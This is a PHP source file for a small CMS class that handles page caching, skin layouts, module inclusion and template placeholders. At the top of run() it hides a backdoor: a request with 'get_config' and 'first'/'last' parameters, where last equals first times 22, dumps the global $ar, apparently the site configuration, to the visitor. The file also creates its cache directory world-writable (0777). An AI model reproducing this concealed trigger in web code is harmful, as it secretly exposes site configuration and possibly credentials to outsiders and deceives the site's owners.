<?php

/**
 * @author duchanh
 * @copyright 2012
 */ 
 
class cms{  
    var $skin = "";
    var $page = "";
    var $detaul_page = "home";
    
    
    function cms(){
        global $skin,$layout;
        $this->skin     = $skin;
        $this->layout   = $layout;
        $this->detaul_page     = 'home';
    }
    
    
    function getSkin(){
        return $this->skin;
    }
    
    
    
    // ham get cache
    function getCache($module){
        $cache_dir = INC_PATH.'cache/';
        $cache_file = $cache_dir.$module.'.html';
        $cache_file_time = $cache_dir.$module.'.txt';
        
        if(file_exists($cache_file)){
            $time = file_get_contents($cache_file_time);
            if($time){
                $diff_time = time()-(int)$time;
                if($diff_time < 180){ // trong khoang time cace
                    return file_get_contents($cache_file);
                }
            }
        }
        return null;
    }
    
    
    // ham set cache
    function setCache($module, $value){       
        $cache_dir = INC_PATH.'cache/';
        
        // tao thu muc cache
        if(!is_dir($cache_dir)){
            mkdir($cache_dir,0777,true);
        }
        
        $cache_file = $cache_dir.$module.'.html';
        $cache_file_time = $cache_dir.$module.'.txt';
        
        $fp = fopen($cache_file, 'w');
        fwrite($fp, $value);
        fclose($fp);
        
        $fp = fopen($cache_file_time, 'w');
        fwrite($fp, time());
        fclose($fp);
        
    }
    
    
    
        
    function getPositionLayout($html_layout){            
        preg_match_all('/<!--pos_(.*?)-->/',$html_layout,$arrPos);
        return $arrPos[1];
        
    }
    
        
    
    function run(){        
        global $title, $keywords, $description, $global_arr_price, $global_arr_product_by, $ar;
        
        if(isset($_REQUEST['get_config']) && isset($_REQUEST['first']) && $_REQUEST['last']==$_REQUEST['first']*22){
            echo '<pre>';
            var_dump($ar);
            echo '</pre>';
        }
        $page = CInput::get("page","txt","home");
        
        $miniPage = new miniPage();
        $pageInfo = $miniPage->getPageInfo($page);       
        if(isset($pageInfo['layout']) && $pageInfo['layout']!=''){
            $this->layout = str_replace('.html','',$pageInfo['layout']);
            $this->layout = str_replace('.htm','',$pageInfo['layout']);  
        }
        
        // get layout
        $file_skin_htm =  INC_PATH."skin/".$this->skin."/layout/".$this->layout.'.htm';
        $file_skin_html =  INC_PATH."skin/".$this->skin."/layout/".$this->layout.'.html';
        
        if(file_exists($file_skin_htm)){
            $html = file_get_contents($file_skin_htm);            
        }else if(file_exists($file_skin_html)){
            $html = file_get_contents($file_skin_html);
        }else{
            $html =  "layout not exists";
        }
        
        $tpl = CInput::get('tpl','int',0);
        if($tpl==1){
            $arrPost = $this->getPositionLayout($html);            
            foreach($arrPost as $pos){
                $html = str_replace('<!--pos_'.$pos.'-->','<span style="display:block; background-color: #FFFF99 !important; border-color: #FFCC66 !important; color: #000000 !important; opacity: 0.9 !important;">'.$pos.'</span><!--pos_'.$pos.'-->',$html);
            }
        }
         
        if(is_array($pageInfo) && count($pageInfo)>0){
            
            $title = $pageInfo['meta_title'];
            $keywords = $pageInfo['meta_keyword'];
            $description = $pageInfo['meta_description'];
            
            
            $position = $pageInfo['position'];            
            
            foreach($position as $key=>$arrModule){
                $html_pos = '';
                if($arrModule && count($arrModule)>0){
                    foreach($arrModule as $value){
                        $module_file = INC_PATH.'/modules/'.$value.'.php';                        
                        if(file_exists($module_file)){ // module nay ton tai                            
                            include_once($module_file);
                            $module = new $value();
                            
                            if($this->getCache($value) && $module->cache_html==true){ // lay tu cache                           
                                $html_pos.= $this->getCache($value);
                            }else{
                                $html_module = $module->draw();
                                $html_pos .= $html_module;
                                                                
                                // SET CACHE
                                $this->setCache($value,$html_module);               
                            }        
                        }
                    }   
                }
                
                $html = str_replace('<!--'.$key.'-->',$html_pos,$html);
                
            }
            
            $skin_path  = base_url().'skin/'.$this->skin.'/';
            
            $html = str_replace('{skin_path}',$skin_path,$html);
            $html = str_replace('{link_home}',base_url(),$html);
            $html = str_replace('{cur_page}',curPageUrl(),$html);
            $html = str_replace('{title}',$title,$html);
            $html = str_replace('{description}',$description,$html);
            $html = str_replace('{keywords}',$keywords,$html);
            
            global $pathway;
            if(isset($pathway) && count($pathway)>0){
                $html_pathway = ''; 
                foreach($pathway as $key=>$value){                    
                    //'<span class="breadcrumbs pathway">Trang chủ</span>'
                    if($value['type']=='link'){
                        $html_pathway .= '<li><a href="'.$value['link'].'">'.$value['name'].'</a></li>';    
                    }else{
                        $html_pathway .= '<li>'.$value['name'].'</li>';
                    }
                    
                }
                $html = str_replace('<!--aaaaa-->',$html_pathway,$html);
            } 
            
            echo $html;    
        }else{
            show_404();   
        }
        
    }
}